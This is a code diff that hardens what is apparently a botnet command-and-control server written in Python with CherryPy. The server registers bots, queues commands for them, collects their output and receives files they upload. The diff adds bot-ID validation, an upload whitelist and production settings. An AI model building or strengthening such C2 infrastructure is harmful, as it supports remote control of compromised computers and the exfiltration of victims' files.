@@ -2,11 +2,19 @@ import cherrypy
 import sqlite3
 import time
 import os
+import re
+import random
+import string
 
 
 UPLOAD_DIR = os.path.join(os.path.dirname(os.path.realpath(__file__)), "uploads")
 if not os.path.exists(UPLOAD_DIR):
     os.makedirs(UPLOAD_DIR)
+pending_uploads = []
+
+
+def validate_botid(candidate):
+    return re.match('^[a-zA-Z0-9\s\-_]+$', candidate) is not None
 
 
 def query_DB(sql, params=()):
@@ -50,6 +58,8 @@ class CNC(object):
 
     @cherrypy.expose
     def bot(self, botid):
+        if not validate_botid(botid):
+            raise cherrypy.HTTPError(403)
         with open("Bot.html", "r") as f:
             html = f.read()
             html = html.replace("{{botid}}", botid)
@@ -59,6 +69,8 @@ class CNC(object):
 class API(object):
     @cherrypy.expose
     def pop(self, botid, sysinfo):
+        if not validate_botid(botid):
+            raise cherrypy.HTTPError(403)
         bot = query_DB("SELECT * FROM bots WHERE name=?", (botid,))
         if not bot:
             exec_DB("INSERT INTO bots VALUES (?, ?, ?, ?)", (botid, time.time(), cherrypy.request.headers["X-Forwarded-For"] if "X-Forwarded-For" in cherrypy.request.headers else cherrypy.request.remote.ip, sysinfo))
@@ -73,14 +85,22 @@ class API(object):
 
     @cherrypy.expose
     def report(self, botid, output):
+        if not validate_botid(botid):
+            raise cherrypy.HTTPError(403)
         exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), output, botid))
 
     @cherrypy.expose
     def push(self, botid, cmd):
+        if not validate_botid(botid):
+            raise cherrypy.HTTPError(403)
         exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), cmd, False, botid))
-    
+        if cmd.startswith("upload "):
+            pending_uploads.append(cmd[len("upload "):])
+
     @cherrypy.expose
     def stdout(self, botid):
+        if not validate_botid(botid):
+            raise cherrypy.HTTPError(403)
         output = ""
         bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date DESC LIMIT 10', (botid,))
         for entry in reversed(bot_output):
@@ -92,9 +112,18 @@ class API(object):
 
     @cherrypy.expose
     def upload(self, botid, src, uploaded):
+        if not validate_botid(botid):
+            raise cherrypy.HTTPError(403)
         up_dir = os.path.join(UPLOAD_DIR, botid)
         if not os.path.exists(up_dir):
             os.makedirs(up_dir)
+        expected_file = src
+        if expected_file not in pending_uploads and src.endswith(".zip"):
+            expected_file = src.split(".zip")[0]
+        if expected_file in pending_uploads:
+            pending_uploads.remove(expected_file)
+        else:
+            raise cherrypy.HTTPError(403)
         while os.path.exists(os.path.join(up_dir, src)):
             src = "_" + src
         save_path = os.path.join(up_dir, src)
@@ -111,7 +140,9 @@ class API(object):
 
 def main():
     config = {'global': {'server.socket_host': '127.0.0.1',
-                'server.socket_port': 8080},
+                'server.socket_port': 8080,
+                'environment': 'production',
+                },
                 '/static': {
                     'tools.staticdir.on': True,
                     'tools.staticdir.dir':  os.path.join(os.path.dirname(os.path.realpath(__file__)), "static")
